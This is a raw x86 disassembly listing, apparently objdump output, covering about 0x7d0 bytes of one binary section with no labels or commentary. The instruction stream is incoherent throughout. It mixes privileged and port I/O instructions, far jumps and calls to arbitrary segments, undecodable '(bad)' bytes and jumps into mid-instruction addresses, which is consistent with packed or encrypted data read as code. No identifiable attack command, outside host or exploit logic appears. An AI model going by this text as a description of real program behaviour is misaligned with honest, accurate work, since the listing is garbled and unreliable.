  406127:	add    ah,BYTE PTR [ebx-0x13]
  40612a:	push   esp
  40612b:	mov    dh,0x30
  40612d:	adc    ebx,esi
  40612f:	xlat   BYTE PTR ds:[ebx]
  406130:	lods   eax,DWORD PTR ds:[esi]
  406131:	xlat   BYTE PTR ds:[ebx]
  406132:	and    eax,0xfaae36fb
  406137:	fist   DWORD PTR [eax+edi*8]
  40613a:	and    ch,BYTE PTR [edi+0x7615a72c]
  406140:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406141:	aaa    
  406142:	leave  
  406143:	xor    edx,DWORD PTR [ebp-0x196e732e]
  406149:	retf   
  40614a:	mov    esi,0xa6c7d86c
  40614f:	add    BYTE PTR ds:0xca45ba80,ah
  406155:	inc    ecx
  406156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406157:	div    BYTE PTR ds:[edx]
  40615a:	add    al,0xd
  40615c:	xchg   edx,eax
  40615d:	hlt    
  40615e:	clc    
  40615f:	jno    0x406142
  406161:	fcmovnu st,st(2)
  406163:	and    dh,BYTE PTR [edi+edx*1+0x42]
  406167:	adc    cl,BYTE PTR [eax+ebx*2]
  40616a:	std    
  40616b:	fstp   TBYTE PTR [ebx+0x21]
  40616e:	inc    ebp
  40616f:	xor    eax,0x18acaf76
  406174:	fnsave [esi]
  406176:	out    0x19,al
  406178:	push   ds
  406179:	fidivr DWORD PTR [ebp-0x22]
  40617c:	ror    DWORD PTR [ecx],cl
  40617e:	dec    esi
  40617f:	dec    esp
  406180:	int3   
  406181:	adc    eax,0xcea2c112
  406186:	xor    BYTE PTR [eax+0x52],al
  406189:	ins    DWORD PTR es:[edi],dx
  40618a:	cmp    eax,ebp
  40618c:	stc    
  40618d:	and    al,0x2a
  40618f:	es cwde 
  406191:	iret   
  406192:	add    BYTE PTR [esp+eiz*4+0x73e275da],ah
  406199:	shl    BYTE PTR [edi],1
  40619b:	push   0xe50a1752
  4061a0:	test   al,0xc0
  4061a2:	je     0x4061bc
  4061a4:	jnp    0x4061bf
  4061a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061a7:	dec    edx
  4061a8:	dec    edx
  4061a9:	mov    ebp,0xff516c3
  4061ae:	mov    edi,0xf2720d08
  4061b3:	cmc    
  4061b4:	pushf  
  4061b5:	out    dx,eax
  4061b6:	aad    0xb2
  4061b8:	test   DWORD PTR fs:[edi],ecx
  4061bb:	ror    ah,1
  4061bd:	nop
  4061be:	dec    edx
  4061bf:	and    ecx,DWORD PTR [eax-0x46e96ac]
  4061c5:	or     eax,0x1bde7488
  4061ca:	sti    
  4061cb:	pop    edi
  4061cc:	lods   eax,DWORD PTR ds:[esi]
  4061cd:	xchg   esi,eax
  4061ce:	push   edi
  4061cf:	cmp    DWORD PTR [eax-0x8cb17ff],ebx
  4061d5:	push   0x13
  4061d7:	push   ebp
  4061d8:	xchg   edi,eax
  4061d9:	test   DWORD PTR [ecx-0x3],ebp
  4061dc:	jecxz  0x4061d3
  4061de:	je     0x4061f9
  4061e0:	lods   al,BYTE PTR ds:[esi]
  4061e1:	pop    ebx
  4061e2:	add    ecx,DWORD PTR ds:0x3444e5dc
  4061e8:	mov    bh,0x5d
  4061ea:	mov    ebp,0x860c8024
  4061ef:	repnz retf 
  4061f1:	jo     0x4061d5
  4061f3:	jge    0x40618a
  4061f5:	shr    bl,0xac
  4061f8:	mov    eax,ds:0xbdf24042
  4061fd:	jo     0x40621a
  4061ff:	(bad)  
  406200:	jbe    0x4061cf
  406202:	(bad)  [edx+0x2d]
  406205:	in     eax,0xcb
  406207:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406208:	push   es
  406209:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40620a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40620b:	in     eax,dx
  40620c:	jbe    0x4061d4
  40620e:	xchg   DWORD PTR [ebx],edi
  406210:	cmp    dh,BYTE PTR [edx]
  406212:	pop    ecx
  406213:	mov    esp,0x7a03d323
  406218:	repnz sub DWORD PTR [esi],edi
  40621b:	xlat   BYTE PTR ds:[ebx]
  40621c:	outs   dx,DWORD PTR ds:[esi]
  40621d:	jle    0x406253
  40621f:	js     0x4061fc
  406221:	das    
  406222:	daa    
  406223:	fild   DWORD PTR ds:0x3319aac8
  406229:	lahf   
  40622a:	ins    BYTE PTR es:[edi],dx
  40622b:	inc    esi
  40622c:	es and dh,ch
  40622f:	xchg   edi,eax
  406230:	scas   eax,DWORD PTR es:[edi]
  406231:	xchg   esi,eax
  406232:	ss leave 
  406234:	mov    ebp,0xe2deb9e
  406239:	push   ds
  40623a:	nop
  40623b:	je     0x4062a7
  40623d:	loope  0x406217
  40623f:	and    edi,DWORD PTR [ecx]
  406241:	aaa    
  406242:	cmp    eax,DWORD PTR [ecx-0x19b1404]
  406248:	fdiv   st(0),st
  40624a:	int3   
  40624b:	fidiv  WORD PTR [esi+0x734b3a29]
  406251:	mov    edx,ds
  406253:	rcr    DWORD PTR [edx-0x6],0x54
  406257:	xor    eax,DWORD PTR [ebp+0x1e]
  40625a:	pushf  
  40625b:	push   esp
  40625c:	xor    al,0xf0
  40625e:	push   ds
  40625f:	sub    eax,0xe9e26f83
  406264:	popf   
  406265:	push   es
  406266:	xchg   DWORD PTR [ecx+0x652d6d9e],ecx
  40626c:	add    al,0x20
  40626e:	and    al,0x4e
  406270:	ds pop ebp
  406272:	xchg   edi,eax
  406273:	adc    ebx,DWORD PTR [esp+edx*8-0x3e]
  406277:	mov    edx,DWORD PTR [edx+ecx*8-0xe80ded]
  40627e:	es cmp cl,ch
  406281:	mov    cl,dl
  406283:	into   
  406284:	neg    DWORD PTR [edx+0x6b]
  406287:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406288:	push   esp
  406289:	loope  0x406281
  40628b:	mov    ds:0x3524919e,eax
  406290:	cdq    
  406291:	cdq    
  406292:	cs dec edx
  406294:	fcomip st,st(1)
  406296:	add    BYTE PTR [esi-0x13],dh
  406299:	mov    ch,0xda
  40629b:	mov    ebx,0xd685fc9d
  4062a0:	lock xchg edi,eax
  4062a2:	(bad)  
  4062a3:	pop    ss
  4062a4:	sbb    eax,0xee085944
  4062a9:	mov    bl,0xed
  4062ab:	call   0xd2fc:0xcf152c0c
  4062b2:	mov    esi,0xd06a291c
  4062b7:	fistp  WORD PTR fs:[ecx+ebx*1+0x19e65143]
  4062bf:	stos   BYTE PTR es:[edi],al
  4062c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062c1:	and    BYTE PTR [ecx],cl
  4062c3:	cmc    
  4062c4:	xor    bh,dl
  4062c6:	fs jae 0x40628e
  4062c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062ca:	push   ss
  4062cb:	cdq    
  4062cc:	sbb    al,0xe0
  4062ce:	push   ss
  4062cf:	clc    
  4062d0:	and    esi,DWORD PTR [esp+edx*4]
  4062d3:	add    BYTE PTR [esi+0x5f52cfd1],bl
  4062d9:	sbb    al,0x85
  4062db:	mov    dl,BYTE PTR [ebp-0x69]
  4062de:	dec    eax
  4062df:	xchg   BYTE PTR [eax],bh
  4062e1:	ret    
  4062e2:	jge    0x406309
  4062e4:	addr16 mov ebx,0x306fb99f
  4062ea:	or     BYTE PTR ds:0x870c62b0,bh
  4062f0:	inc    ebx
  4062f1:	rol    BYTE PTR [ebx+0x14],cl
  4062f4:	jne    0x4062aa
  4062f6:	and    eax,0xe1c8e21f
  4062fb:	clc    
  4062fc:	cmp    al,0x3f
  4062fe:	leave  
  4062ff:	lock jo 0x4062bd
  406302:	xchg   esi,esi
  406304:	cwde   
  406305:	js     0x40631a
  406307:	adc    al,0xca
  406309:	mov    eax,0x14149dee
  40630e:	fwait
  40630f:	or     BYTE PTR [ecx+ebx*4-0x50],0x68
  406314:	jbe    0x4062ad
  406316:	ret    0x68d6
  406319:	and    bl,cl
  40631b:	shr    DWORD PTR [ebx-0x7b],cl
  40631e:	sbb    dh,bl
  406320:	gs not ah
  406323:	mov    cl,0x4f
  406325:	mov    ebx,0x4b6a2a83
  40632a:	(bad)  
  40632b:	jmp    0xf7e:0xee955c11
  406332:	mov    dh,0x62
  406334:	dec    esi
  406335:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406336:	push   0x70
  406338:	push   eax
  406339:	mov    es,esi
  40633b:	sub    dh,al
  40633d:	sbb    esp,ebx
  40633f:	mov    esi,0x65c80c75
  406344:	and    BYTE PTR [edi],ch
  406346:	add    ebp,edx
  406348:	jmp    0x4063c8
  40634a:	add    eax,0x9851359c
  40634f:	mov    edx,0xbb91bde8
  406354:	or     al,0xda
  406356:	sahf   
  406357:	ins    BYTE PTR es:[edi],dx
  406358:	push   edi
  406359:	add    eax,0xb9aedc1c
  40635e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40635f:	mov    ebp,ebx
  406361:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  406363:	and    dl,cl
  406365:	mov    bl,0x1e
  406367:	cmp    eax,0xbc07daa9
  40636c:	addr16 dec esi
  40636e:	repz xor bl,ch
  406371:	in     eax,0x7e
  406373:	icebp  
  406374:	adc    ch,BYTE PTR [esi+0x2c]
  406377:	mov    ss:0x80c23cc0,eax
  40637d:	fcmovb st,st(0)
  40637f:	cs ja  0x4063cc
  406382:	inc    edx
  406383:	xlat   BYTE PTR ds:[ebx]
  406384:	retf   
  406385:	daa    
  406386:	div    BYTE PTR [ecx+0x24]
  406389:	leave  
  40638a:	inc    esp
  40638b:	jnp    0x406385
  40638d:	mov    ecx,0x6be4875a
  406392:	pusha  
  406393:	add    al,0x29
  406395:	push   esi
  406396:	out    dx,al
  406397:	inc    eax
  406398:	push   ds
  406399:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40639a:	jp     0x4063cf
  40639c:	add    ah,ch
  40639e:	rcr    DWORD PTR [edx],0xe
  4063a1:	adc    ecx,edi
  4063a3:	mov    bh,0xd1
  4063a5:	pop    ds
  4063a6:	fld    TBYTE PTR [ebp-0x4c6a8ae4]
  4063ac:	xlat   BYTE PTR ds:[ebx]
  4063ad:	add    eax,0xa0739dfb
  4063b2:	mov    edx,0xd8770dc4
  4063b7:	or     ecx,DWORD PTR [ebx-0x3c]
  4063ba:	shl    BYTE PTR [ecx+0x20],cl
  4063bd:	fisub  DWORD PTR [edx+eiz*2-0x647655a6]
  4063c4:	(bad)  
  4063c5:	std    
  4063c6:	xor    al,0xa4
  4063c8:	mov    ebp,?
  4063ca:	aas    
  4063cb:	sbb    DWORD PTR [ebx+ecx*1-0x7a237753],ecx
  4063d2:	pop    ss
  4063d3:	and    eax,0x73a5ca8d
  4063d8:	stc    
  4063d9:	ret    0x79d8
  4063dc:	sub    ebp,DWORD PTR [ebx+0x44]
  4063df:	sub    eax,0xa9f97cf4
  4063e4:	jg     0x4063d3
  4063e6:	xchg   DWORD PTR [ecx+0x7f],ebp
  4063e9:	adc    al,dh
  4063eb:	cmp    eax,0x720fe59c
  4063f0:	int3   
  4063f1:	jns    0x4063e5
  4063f3:	daa    
  4063f4:	stos   BYTE PTR es:[edi],al
  4063f5:	adc    eax,0xff338050
  4063fa:	cmp    BYTE PTR [ebx-0x34993162],bl
  406400:	lds    eax,FWORD PTR [esi+edx*8-0x34]
  406404:	in     eax,dx
  406405:	adc    al,0xc2
  406407:	cmp    DWORD PTR [ebx-0x375df2e1],0x5a
  40640e:	in     eax,0x4c
  406410:	lds    edi,FWORD PTR [edx-0x741713cc]
  406416:	les    eax,FWORD PTR ds:0x5dace610
  40641c:	wbinvd 
  40641e:	push   esi
  40641f:	cmp    al,0xb6
  406421:	mov    ds:0x2de7cf5b,eax
  406426:	jge    0x406468
  406428:	stc    
  406429:	sub    eax,0x8074e76d
  40642e:	jp     0x40646e
  406430:	or     BYTE PTR [edx+ecx*4-0x4f],0x1c
  406435:	cmc    
  406436:	jbe    0x4063c6
  406438:	fistp  QWORD PTR [ebp+0x73422356]
  40643e:	xchg   ebp,eax
  40643f:	stc    
  406440:	out    0x6d,eax
  406442:	and    DWORD PTR [eax-0x77f5b174],edi
  406448:	mov    ah,0x3d
  40644a:	mov    BYTE PTR ds:0xb94c0eee,0x9f
  406451:	xor    DWORD PTR [edx+0x6],0x54
  406455:	enter  0x2eb8,0x1
  406459:	adc    eax,0xef3968a9
  40645e:	js     0x40646d
  406460:	and    eax,0x72221d02
  406465:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406466:	retf   
  406467:	mov    edx,0x9186ac93
  40646c:	pop    es
  40646d:	test   al,0xc7
  40646f:	lods   al,BYTE PTR ds:[esi]
  406470:	iretw  
  406472:	imul   eax,DWORD PTR [ebp+eiz*8+0x8d28cf7],0x6dff8ce2
  40647d:	pop    edx
  40647e:	sahf   
  40647f:	or     dl,BYTE PTR [ebx+0x15]
  406482:	out    dx,al
  406483:	jns    0x40645d
  406485:	fs ins BYTE PTR es:[edi],dx
  406487:	out    0xbe,al
  406489:	mov    BYTE PTR [ebx+0x2e],dl
  40648c:	xor    ch,ah
  40648e:	das    
  40648f:	shr    DWORD PTR ds:0x22c2f567,0x5c
  406496:	add    DWORD PTR [ebp-0x70],0xc9da82c7
  40649d:	pushf  
  40649e:	pop    edi
  40649f:	aad    0xf
  4064a1:	jo     0x406495
  4064a3:	sti    
  4064a4:	xlat   BYTE PTR ds:[ebx]
  4064a5:	outs   dx,BYTE PTR ds:[esi]
  4064a6:	retf   0x609a
  4064a9:	loope  0x4064e9
  4064ab:	aaa    
  4064ac:	(bad)  
  4064ad:	bound  esp,QWORD PTR [esi+0x8]
  4064b0:	sub    al,0xa9
  4064b2:	push   eax
  4064b3:	aam    0x41
  4064b5:	dec    ebx
  4064b6:	push   ds
  4064b7:	mov    DWORD PTR [ebp+0x51],0xc2bcd24f
  4064be:	mov    eax,ds:0x15d5d7b3
  4064c3:	out    0x9b,al
  4064c5:	loope  0x4064aa
  4064c7:	sbb    esi,DWORD PTR [edx]
  4064c9:	xchg   ebp,eax
  4064ca:	test   al,0x7c
  4064cc:	mov    ebx,DWORD PTR [edx+0x5141cfdb]
  4064d2:	jnp    0x4064cb
  4064d4:	in     eax,0x15
  4064d6:	lahf   
  4064d7:	aaa    
  4064d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064d9:	loopne 0x4064a3
  4064db:	test   BYTE PTR [eax+0x7a224d2b],dh
  4064e1:	mov    edi,0x505848d1
  4064e6:	shl    BYTE PTR [ebx+0x7c],cl
  4064e9:	and    eax,0x33a8e616
  4064ee:	xor    esi,ebx
  4064f0:	push   0xffffffe8
  4064f2:	leave  
  4064f3:	call   0x4663:0x4a9cb1f6
  4064fa:	cmp    eax,0x619fefb9
  4064ff:	jg     0x406558
  406501:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406502:	or     DWORD PTR [ebx],0xffffffc2
  406505:	stos   BYTE PTR es:[edi],al
  406506:	std    
  406507:	in     eax,0x86
  406509:	ins    DWORD PTR es:[edi],dx
  40650a:	loopne 0x4064a6
  40650c:	mov    dl,0xb5
  40650e:	sub    eax,0xffe6f8d1
  406513:	add    al,0xd1
  406515:	cmp    BYTE PTR [ecx+0x1e7ccb1b],ah
  40651b:	mov    ecx,0x82adb35a
  406520:	cmp    esi,eax
  406522:	inc    edi
  406523:	mov    DWORD PTR [esi-0x5a66c5f1],ecx
  406529:	imul   ecx,DWORD PTR [ebp-0x54],0x42
  40652d:	lods   al,BYTE PTR ds:[esi]
  40652e:	sbb    BYTE PTR [ebx-0x11369052],bl
  406534:	cdq    
  406535:	js     0x4064de
  406537:	test   DWORD PTR [ecx+0x66c6d30a],ebx
  40653d:	pop    ds
  40653e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40653f:	int3   
  406540:	mov    bl,0xee
  406542:	call   0x3252:0x70095ec9
  406549:	xchg   ebx,eax
  40654b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40654c:	push   edx
  40654d:	sbb    al,BYTE PTR [esi+0x66]
  406550:	inc    eax
  406551:	mov    eax,0x10310e1
  406556:	int3   
  406557:	jbe    0x4065a5
  406559:	scas   al,BYTE PTR es:[edi]
  40655a:	mov    ecx,0x9eae9517
  40655f:	aad    0xd9
  406561:	push   0x22
  406563:	xor    DWORD PTR ds:0xee94c06a,esp
  406569:	mov    ds:0xaa7698ee,eax
  40656e:	xor    al,0x2c
  406570:	ins    DWORD PTR es:[edi],dx
  406571:	sbb    BYTE PTR [esi+0x59f507],ch
  406577:	add    DWORD PTR [edx-0xb08932c],ebp
  40657d:	retf   
  40657e:	cs pop es
  406580:	retf   
  406581:	repnz or BYTE PTR [bp+di+0x3fcd],al
  406587:	ins    DWORD PTR es:[edi],dx
  406588:	ret    
  406589:	or     eax,0x6868dbf2
  40658e:	inc    ebx
  40658f:	mov    dh,dh
  406591:	bound  esp,QWORD PTR [esi-0x67615fe9]
  406597:	cmp    eax,0x33c024d3
  40659c:	outs   dx,BYTE PTR ds:[esi]
  40659d:	add    DWORD PTR ds:0x682feb7d,esp
  4065a3:	pusha  
  4065a4:	cmp    dl,cl
  4065a6:	repnz or BYTE PTR [edx-0xd1e47b1],ch
  4065ad:	or     DWORD PTR cs:[ebx+eiz*4-0x465c63ce],esi
  4065b5:	jnp    0x406555
  4065b7:	adc    bp,WORD PTR [ebp+0x2]
  4065bb:	and    dl,BYTE PTR [esi+0x27]
  4065be:	outs   dx,DWORD PTR ds:[esi]
  4065bf:	fidiv  WORD PTR [edi+ebp*8-0x237ea743]
  4065c6:	rcr    cl,cl
  4065c8:	xor    ecx,ebp
  4065ca:	push   cs
  4065cb:	dec    esp
  4065cc:	stos   BYTE PTR es:[edi],al
  4065cd:	mov    ecx,0x633c7529
  4065d2:	xchg   esi,esi
  4065d4:	dec    esi
  4065d5:	retf   
  4065d6:	jp     0x40664c
  4065d8:	dec    ebp
  4065d9:	addr16 aas 
  4065db:	loopne 0x4065b0
  4065dd:	(bad)  
  4065de:	ret    0xdad6
  4065e1:	cmp    eax,0xe24caeb7
  4065e6:	popf   
  4065e7:	sbb    esi,eax
  4065e9:	inc    esi
  4065ea:	in     eax,0xf6
  4065ec:	sti    
  4065ed:	dec    ebp
  4065ee:	repnz add eax,DWORD PTR [ebx+0x1e]
  4065f2:	adc    eax,0x2b029ff2
  4065f7:	gs test eax,0x581df5ef
  4065fd:	cmp    eax,ebx
  4065ff:	fsubrp st(7),st
  406601:	clc    
  406602:	lods   al,BYTE PTR ds:[esi]
  406603:	push   0x1c
  406605:	jne    0x4065a6
  406607:	mov    DWORD PTR [esp+edi*1-0x56d151e0],ecx
  40660e:	cwde   
  40660f:	cwde   
  406610:	test   eax,0xe352537d
  406615:	in     al,dx
  406616:	clc    
  406617:	inc    ecx
  406618:	xchg   DWORD PTR [ebx+0x64e16390],ecx
  40661e:	push   ebp
  40661f:	push   ss
  406620:	ins    BYTE PTR es:[edi],dx
  406621:	adc    al,cl
  406623:	mov    bh,0xc1
  406625:	fiadd  DWORD PTR [edi+edx*8]
  406628:	mov    BYTE PTR [edx-0x68],al
  40662b:	int3   
  40662c:	jns    0x4065be
  40662e:	adc    BYTE PTR [ebx+0x25],0xdc
  406632:	jp     0x4065c6
  406634:	mov    ds:0x9f4e27e0,eax
  406639:	add    ebp,ecx
  40663b:	dec    ebx
  40663c:	push   ds
  40663d:	mov    ebp,cs
  40663f:	lods   al,BYTE PTR ds:[esi]
  406640:	mov    BYTE PTR [ebx],bh
  406642:	inc    ebx
  406643:	sar    DWORD PTR [edi],cl
  406645:	out    0xe0,al
  406647:	dec    esi
  406648:	loope  0x406625
  40664a:	gs stc 
  40664c:	popf   
  40664d:	mov    DWORD PTR [esi+0x6925c2d0],0x14c0b4f
  406657:	inc    edx
  406658:	push   ds
  406659:	mov    ebx,0x73ee2f0e
  40665e:	lea    ecx,[esi+edx*1-0x650bfc1f]
  406665:	pop    ebp
  406666:	cmp    esp,DWORD PTR [esi+0x59]
  406669:	pop    esi
  40666a:	mov    al,0x83
  40666c:	test   eax,0x4980f76d
  406671:	fndisi(8087 only) 
  406673:	inc    esp
  406674:	cli    
  406675:	add    al,0xe8
  406677:	and    BYTE PTR [esi-0x730068e0],bh
  40667d:	ret    0xb302
  406680:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406681:	in     eax,0x9f
  406683:	fbld   TBYTE PTR [ecx+0x6f]
  406686:	loopne 0x4066ba
  406688:	ja     0x406683
  40668a:	bound  esi,QWORD PTR [ebx+eax*1+0x26]
  40668e:	mov    BYTE PTR [esi-0x33],ch
  406691:	outs   dx,BYTE PTR ds:[esi]
  406693:	add    ecx,ebx
  406695:	adc    al,0x8e
  406697:	lahf   
  406698:	push   0xffffff87
  40669a:	jg     0x23f22ede
  4066a0:	mov    dl,BYTE PTR [ebp+0x255bbbc]
  4066a6:	adc    eax,0xd58db971
  4066ab:	addr16 xor al,0x23
  4066ae:	test   al,0xb8
  4066b0:	bound  bp,DWORD PTR [ebx+0x77]
  4066b4:	fild   WORD PTR [ebx+eiz*4+0x3fcd8908]
  4066bb:	mov    ecx,0x4ed8bf57
  4066c0:	mov    bl,0x89
  4066c2:	stos   BYTE PTR es:[edi],al
  4066c3:	jb     0x40668d
  4066c5:	hlt    
  4066c6:	and    esp,DWORD PTR [ebp-0x29b6d7b6]
  4066cc:	or     eax,0xe41ba60c
  4066d1:	data16 jbe 0x406666
  4066d4:	int    0x19
  4066d6:	cmp    cl,ch
  4066d8:	xchg   DWORD PTR [ebx],edi
  4066da:	inc    esi
  4066db:	lods   al,BYTE PTR ds:[esi]
  4066dc:	add    eax,0xaadf975d
  4066e1:	sub    DWORD PTR [ebp-0x4a1e468b],edx
  4066e7:	fisub  DWORD PTR [ebx+eiz*2+0x46]
  4066eb:	cmp    DWORD PTR [ecx+0x11bc06c9],eax
  4066f1:	mov    BYTE PTR [eax+0x78],dl
  4066f4:	sbb    al,0x2e
  4066f6:	repz repz dec ebp
  4066f9:	iret   
  4066fa:	xchg   BYTE PTR [edx+0x69],al
  4066fd:	cmp    eax,0x9bcbb504
  406702:	outs   dx,BYTE PTR ds:[esi]
  406703:	cwde   
  406704:	das    
  406705:	add    al,0x21
  406707:	mov    al,ds:0x4f6c882d
  40670c:	pcmpgtd mm1,QWORD PTR [edi+eiz*8-0x23c11b69]
  406714:	sti    
  406715:	loopne 0x4066f9
  406717:	sbb    dl,bl
  406719:	inc    ebx
  40671a:	add    BYTE PTR [ecx-0x5e95be7b],cl
  406720:	pop    ds
  406721:	mov    esi,0x2f90b49e
  406726:	add    al,BYTE PTR [edx+edx*4-0x53]
  40672a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40672b:	loop   0x406781
  40672d:	in     al,0x55
  40672f:	fiadd  WORD PTR [edi]
  406731:	jne    0x4066ee
  406733:	and    eax,0x308cf320
  406738:	adc    DWORD PTR [ebp+0x37],edx
  40673b:	out    0x17,al
  40673d:	or     al,0xcc
  40673f:	je     0x406720
  406741:	push   esp
  406742:	out    0x3b,al
  406744:	outs   dx,DWORD PTR ds:[esi]
  406745:	(bad)  
  406746:	push   esp
  406747:	int    0x1b
  406749:	ret    0x83c1
  40674c:	(bad)  
  40674d:	dec    ebp
  40674e:	or     al,0x1b
  406750:	pop    edx
  406751:	xor    ebp,ecx
  406753:	test   al,0x58
  406755:	mul    BYTE PTR [ebp-0x20]
  406758:	outs   dx,DWORD PTR ds:[esi]
  406759:	daa    
  40675a:	fdiv   DWORD PTR [esp+edi*1+0x5bd1ef2e]
  406761:	dec    esp
  406762:	inc    ebp
  406763:	and    DWORD PTR [esi],eax
  406765:	nop
  406766:	pop    edx
  406767:	inc    edx
  406768:	mov    edi,0xbc7cbba4
  40676d:	or     BYTE PTR [ebx+ebx*8-0x4f],dh
  406771:	test   al,0xb0
  406773:	sar    DWORD PTR [esi+ebp*1],cl
  406776:	cmp    dh,bh
  406778:	clc    
  406779:	mov    bh,0xb6
  40677b:	xchg   edx,eax
  40677c:	vpand  xmm6,xmm7,XMMWORD PTR [esp+esi*8-0x162246ae]
  406785:	popa   
  406786:	cwde   
  406787:	lods   eax,DWORD PTR ds:[esi]
  406788:	xchg   ecx,ebx
  40678a:	lds    eax,FWORD PTR [edx+ebx*8-0x39]
  40678e:	mov    esp,0x64965e8c
  406793:	shr    DWORD PTR [ecx-0x7cfc0774],0xec
  40679a:	fst    QWORD PTR [ecx+0x6e]
  40679d:	and    dh,dl
  40679f:	cmc    
  4067a0:	nop
  4067a1:	sar    BYTE PTR [esi+0x55],1
  4067a4:	jnp    0x406729
  4067a6:	mov    dl,0x92
  4067a8:	fcomp  QWORD PTR [eax]
  4067ab:	adc    BYTE PTR [edx-0x36],al
  4067ae:	jmp    0x19fe814c
  4067b3:	mov    cl,0x95
  4067b5:	in     al,0x3a
  4067b7:	lock ins DWORD PTR es:[edi],dx
  4067b9:	mov    eax,0x1a7aff0
  4067be:	rcl    DWORD PTR [edi+0x56],1
  4067c1:	xor    dh,cl
  4067c3:	rcr    BYTE PTR [edi-0x21d2d443],0xcf
  4067ca:	sar    BYTE PTR [eax+0x39ca7b7b],1
  4067d0:	pop    ebp
  4067d1:	mov    bh,0xac
  4067d3:	repnz es aad 0xa1
  4067d7:	shr    DWORD PTR [esi],1
  4067d9:	sbb    eax,DWORD PTR [edx+0x65bf96fd]
  4067df:	sbb    DWORD PTR [eax-0x1e609a6b],esi
  4067e5:	ins    BYTE PTR es:[edi],dx
  4067e6:	xchg   edx,eax
  4067e7:	repnz sub ch,0xa1
  4067eb:	inc    ecx
  4067ec:	je     0x406834
  4067ee:	dec    ebx
  4067ef:	dec    edx
  4067f0:	xchg   esi,eax
  4067f1:	or     DWORD PTR [ecx+0x5a],edx
  4067f4:	push   es
  4067f5:	sub    ch,BYTE PTR [edx-0x1f]
  4067f8:	imul   ecx,DWORD PTR [ebx+0x74],0xffffffe1
  4067fc:	jae    0x4067a1
  4067fe:	gs mov ebx,0x5e998af4
  406804:	push   eax
  406805:	ds fs push edx
  406808:	mov    BYTE PTR [eax+0x5d],bh
  40680b:	fwait
  40680c:	stc    
  40680d:	push   0x19
  40680f:	lock loope 0x40687f
  406812:	dec    edi
  406813:	out    dx,eax
  406814:	add    DWORD PTR [ebp+0x1709319],ebp
  40681a:	xor    esi,DWORD PTR [ecx-0x61]
  40681d:	and    ebx,ebp
  40681f:	pop    esi
  406820:	ret    
  406821:	pusha  
  406822:	ins    DWORD PTR es:[edi],dx
  406823:	mov    ebx,0x93967512
  406828:	push   esi
  406829:	fwait
  40682a:	(bad)  
  40682b:	mov    esp,0xcf41c6a3
  406830:	das    
  406831:	gs scas eax,DWORD PTR es:[edi]
  406833:	mov    ah,0x49
  406835:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406836:	dec    edi
  406837:	hlt    
  406838:	mov    cl,0xc3
  40683a:	mov    BYTE PTR [esi],al
  40683c:	sub    DWORD PTR ds:0xe031ce09,esi
  406842:	loop   0x4068c1
  406844:	xor    BYTE PTR [ebp+0x6],bl
  406847:	je     0x4068a3
  406849:	xchg   bl,cl
  40684b:	or     BYTE PTR [esi+0x23756ef3],0x4
  406852:	pop    ecx
  406853:	sbb    DWORD PTR [edx+0x63c7b5fa],edi
  406859:	sbb    ebx,DWORD PTR [edi]
  40685b:	aas    
  40685c:	dec    eax
  40685d:	arpl   WORD PTR [ebx],ax
  40685f:	out    dx,eax
  406860:	add    ah,dh
  406862:	mov    bl,0x38
  406864:	mov    ebp,0x72a647f0
  406869:	mov    dh,0x3d
  40686b:	sbb    DWORD PTR [eax-0x1e34d30d],ecx
  406871:	push   esp
  406872:	cmp    esi,DWORD PTR [esp+eiz*4]
  406875:	mov    eax,ds:0x38e04f
  40687a:	jp     0x40689c
  40687c:	xor    bh,ah
  40687e:	xchg   BYTE PTR [eax],bh
  406880:	shl    DWORD PTR [edx+ebp*1],cl
  406883:	not    BYTE PTR [esi+ebx*2]
  406886:	mov    edx,DWORD PTR [eax-0xf]
  406889:	jge    0x40687d
  40688b:	cmp    al,0xd7
  40688d:	mov    al,ds:0x38ae8aec
  406892:	sub    BYTE PTR [edi+ebp*4],al
  406895:	xchg   edi,ebp
  406897:	outs   dx,DWORD PTR ds:[esi]
  406898:	fst    QWORD PTR [edi-0x542dfa7a]
  40689e:	mul    DWORD PTR [ecx+0x4d0f60ef]
  4068a4:	jmp    0xd3cb:0xe7f07baa
  4068ab:	or     eax,0xa82720d3
  4068b0:	and    ch,BYTE PTR [esi-0xb]
  4068b3:	mov    ah,0xa7
  4068b5:	mov    cl,0xa6
  4068b7:	xchg   edx,eax
  4068b8:	pusha  
  4068b9:	and    al,0x9c
  4068bb:	xchg   ebx,eax
  4068bc:	outs   dx,BYTE PTR es:[esi]
  4068be:	cmp    BYTE PTR [ebp+0x1a],al
  4068c1:	sbb    DWORD PTR [ecx+0x8],esi
  4068c4:	pop    ds
  4068c5:	loop   0x4068e9
  4068c7:	mov    ds:0x90fbdf46,eax
  4068cc:	xchg   esp,eax
  4068cd:	(bad)  
  4068ce:	jmp    0xcde4:0x791ace27
  4068d5:	loop   0x4068ec
  4068d7:	xchg   BYTE PTR [ebx+eiz*1-0x74],dh
  4068db:	in     al,0x7f
  4068dd:	mov    ah,0x7b
  4068df:	sbb    ah,BYTE PTR [edx-0x62]
  4068e2:	mov    edi,0xd9de025
  4068e7:	sbb    DWORD PTR [esi-0x6e],0x11
  4068eb:	inc    ebx
  4068ec:	fidiv  DWORD PTR [ebx+0x45738850]
  4068f2:	sub    al,0xf6
  4068f4:	imul   esi,DWORD PTR [esi+0x64ee95fe],0x44
